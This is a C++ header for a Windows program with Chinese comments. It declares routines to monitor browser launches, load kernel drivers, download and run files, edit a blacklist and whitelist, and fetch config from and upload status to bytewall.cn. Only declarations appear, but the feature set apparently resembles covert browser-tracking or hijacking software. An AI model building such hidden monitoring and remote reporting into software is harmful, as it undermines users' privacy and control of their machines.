//#define UNICODE
#pragma once
#pragma warning(disable : 4996)

#include <stdio.h>
#include <stdlib.h>
#include <mbstring.h>
#include <time.h>
#include <tchar.h>
#include <locale.h>
#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <winternl.h>
#include <wininet.h>
#include "Iphlpapi.h"
#include "cJSON.h"
#include <map>
#include <string>
#include <iostream>
#include <time.h>
#include <sys/timeb.h>
#include <comdef.h>
#include <Wbemidl.h>
#include <shlwapi.h>
#include <atlconv.h>
#include "b64.h"
#include <io.h>
#include <shlobj_core.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "USER32.lib")
#pragma comment(lib, "Version.lib")
#pragma comment(lib, "Urlmon.lib")
#pragma comment(lib, "Wininet.lib")

#pragma comment(lib,"ws2_32")
#pragma comment(lib,"Iphlpapi")


#define GET_RANDOM get_random_string(6)
#define ID_TIMER 0
#define ID_TIMER2 1
#define ID_TIMER3 2

#define CFG_SET(key,val) RegWrite(HKEY_LOCAL_MACHINE, L"HARDWARE\\ZYCFG", REG_QWORD,key, val, sizeof(DWORD64));
#define CFG_GET(key) RegReadQword(HKEY_LOCAL_MACHINE, L"HARDWARE\\ZYCFG", key);
#define CFG_GETHTTP(key) RegReadQword(HKEY_LOCAL_MACHINE, L"HARDWARE\\BWCFG", key);


using namespace std;
//不显示exe
//#pragma comment(linker, "/SUBSYSTEM:WINDOWS")

//下载配置文件
#define api_config "http://www.bytewall.cn/hp/config.json"

//上传状态信息
#define api_upload "http://bytewall.cn:8027/home/updaload"

//构造json数据 纯宏定义实现
#define json_start(doc) char* __##doc=doc; __##doc[0]='{';__##doc++;
#define json_str(doc,key,val) __##doc+=sprintf(__##doc,"\"%s\":\"%s\",",key,val)
#define json_int(doc,key,val) __##doc+=sprintf(__##doc,"\"%s\":%lld,",key,(__int64)val)
#define json_end(doc) __##doc[-1]='}';


//EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
EXTERN_C NTSTATUS NTAPI LdrFindResource_U(IN PVOID DllHandle, IN const ULONG_PTR* ResourceIdPath, IN ULONG ResourceIdPathLength, OUT PIMAGE_RESOURCE_DATA_ENTRY* ResourceDataEntry);
EXTERN_C NTSTATUS NTAPI LdrAccessResource(IN PVOID DllHandle, IN const IMAGE_RESOURCE_DATA_ENTRY* ResourceDataEntry, OUT PVOID* Address OPTIONAL, OUT PULONG Size OPTIONAL);
EXTERN_C DWORD NTAPI RtlComputeCrc32(DWORD dwInitial, BYTE* pData, INT iLen);
EXTERN_C NTSTATUS NTAPI ZwQueryInformationProcess(HANDLE ProcessHandle, ULONG ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);





EXTERN_C PPEB NTAPI RtlGetCurrentPeb(VOID);
EXTERN_C BOOLEAN NTAPI RtlIsNameInExpression(PUNICODE_STRING Expression, PUNICODE_STRING Name, BOOLEAN IgnoreCase, PWCH UpcaseTable);
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PDWORD Enabled);
EXTERN_C NTSTATUS NTAPI LdrGetProcedureAddress(HMODULE ModuleHandle, PANSI_STRING FunctionName OPTIONAL, WORD Ordinal OPTIONAL, PVOID* FunctionAddress);

EXTERN_C NTSTATUS NTAPI NtQueryInformationProcess(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL
);


void _LOG(const wchar_t* fmt, ...);

//#define LOG 
#define LOG _LOG




LPVOID Wow64_GetModuleHandle(const wchar_t *path);
PVOID Wow64_GetProcAddress(LPVOID Base, const char *lpProcName);
//查询文件版本信息
BOOL w_query_version(const wchar_t* ValueName, wchar_t* szModuleName, wchar_t* RetStr);
BOOL query_version(const char* ValueName, char* szModuleName, char* RetStr);

char* http_get(char* url);
int get_mac_wmac(char* mac, char* wmac);
void* MySearchMemory(char* tzm,char* start_address,size_t length);
size_t SearchPE(char *Tzm, wchar_t *file,size_t nNumber);
unsigned char* decryptblacklist(unsigned char* data,size_t length);

int write_file(const wchar_t* path,void* data,size_t length );
int write_file2(std::wstring path, void* data, size_t length);
DWORD foa_to_rvaA(PVOID PeBase, DWORD dwFoa);
unsigned char* sunday(void* a_buf1,unsigned int len1,void* a_buf2,unsigned int len2) ;
char* get_random_string(int n);
void* DataEnc(void* Data, size_t DataLength, int type);
DWORD RunExe(wchar_t* cmd,int wShowWindow);

HANDLE LoadSYS(const TCHAR* szDriverPath, const TCHAR* szLinkName);
BOOL LoadNTDriver(wchar_t* lpszDriverName,wchar_t* lpszDriverPath);
BOOL UnloadNTDriver(wchar_t* szSvrName );

BOOL RegWrite2(HKEY hkay, VOID* lpSubKey,DWORD dwType,  VOID* KeyName, VOID* Data, DWORD DataLength);
BOOL RegDelVal(HKEY hkay, VOID* lpSubKey,VOID* KeyName);
long long dllPathToReg(LPCWSTR strSubKey, LPCWSTR Name);
HRESULT DownloadFile(LPCWSTR URL,LPCWSTR LocalFilePath);
void rc4(unsigned char* plaintext, int plaintext_length, unsigned char* key, int keylength, unsigned char* ciphertext);


//rc4

// 解密，返回解密结果
//char* Decrypt(const char* szSource, const char* szPassWord);

// 加密，返回加密结果
//char* Encrypt(const char* szSource, const char* szPassWord);
//int RC4(const unsigned char* data, int data_len, const unsigned char* key, int key_len, unsigned char* out, int* out_len);
//int GetKey(const unsigned char* pass, int pass_len, unsigned char* out);
//交换
static void swap_byte(unsigned char* a, unsigned char* b);

//把十六进制字符串，转为字节码，每两个十六进制字符作为一个字节
unsigned char* HexToByte(const char* szHex);
//把字节码转为十六进制码，一个字节两个十六进制，内部为字符串分配空间
char* ByteToHex(const unsigned char* Byte, const int Len);
//==========================================================================
BOOL RegWrite(HKEY hkay, LPCWSTR lpSubKey, DWORD dwType, LPCWSTR KeyName, DWORD64 Data, DWORD DataLength);
LPBYTE RegRead(HKEY hkay, LPCWSTR lpSubKey, LPCWSTR KeyName);
LPBYTE RegRead2(HKEY hkay, LPCWSTR lpSubKey, LPCWSTR KeyName, DWORD* length);
DWORD64 RegReadQword(HKEY hkay, LPCWSTR lpSubKey, LPCWSTR KeyName);
int get_process_name(unsigned long processId, wchar_t* name);//获取不带地址的进程名

int get_process_exe_name(char* Pathname, char* Exename);//通过带路径的进程名，获取不带路径的进程名
char* read_file(const wchar_t* path, size_t* len);
int get_url(char* data, int len, char* url, char* url_arg);
//DWORD GetParentPIDAndName(DWORD ProcessID, wchar_t* lpszBuffer_Parent_Name);
char* WcharToChar(const wchar_t* wp);
wchar_t* CharToWchar(const char* str);
void* SearchMemoryBlock(short Next[], WORD* Tzm, WORD TzmLength, unsigned char* StartAddress, unsigned long size);
void* SearchMemory(const char* tzm, char* start_address, size_t length);
//BOOL query_version(const wchar_t* ValueName, wchar_t* szModuleName, wchar_t* RetStr);
//PVOID  MyGetProcAddress(HMODULE hmodule, const char* ApiName);
char* decrypt(char* data, size_t length);
//int write_file(const char* path, void* data, size_t length);
//int get_mac_wmac(char* mac, char* wmac);
//char* http_get(char* url);
//void rc4(unsigned char* plaintext, int plaintext_length, unsigned char* key, int keylength, unsigned char* ciphertext);
//int stringmatchlen(const char* pattern, int patternLen, const char* string, int stringLen, int nocase);



//获取进程名
//int getProcessName(DWORD pid, wchar_t* fname, DWORD sz);
//获取父进程id   
DWORD getParentPID(DWORD pid);
//获取父进程名字
DWORD GetParentPIDAndName(DWORD ProcessID, char* lpszBuffer_Parent_Name);

//============================================================================

int installe_main();
DWORD WINAPI  ReturnData(LPVOID  a);

//判断是不是浏览器
//返回值  1=进程产品名是浏览器进程 10=进程名是浏览器进程 100=该进程包含浏览器内核dll  可组合判断
int Determining_browser(unsigned long processId, string process_name);


//zh.cpp
//利用WMI
VOID PS_NOCICE(DWORD pid);

DWORD WINAPI ProcessMonitor(PVOID CB_PS_NOCICE); //监控进程启动

DWORD WINAPI ProcessKillMonitor(PVOID a);//监控进程结束
//判断浏览器第一次打开
void  first_open_browser(unsigned long processId, string process_name);

void first_kill_browser(char* process_name);
//获取进程快照，遍历进程
DWORD WINAPI get_Process_Information(char* process_path, char* process_name, wchar_t* process_name_zy);

//检索当前目录下的文件夹或文件（最多检索到以及目录）
int listFiles(const char* dir);



//遍历文件夹
wchar_t* GetAllgpxFilepathFromfolder(const wchar_t* Path, wchar_t* NewPath);

//修改黑白名单
int Modify_b_and_w();

void printfLog(char* wszlog);


























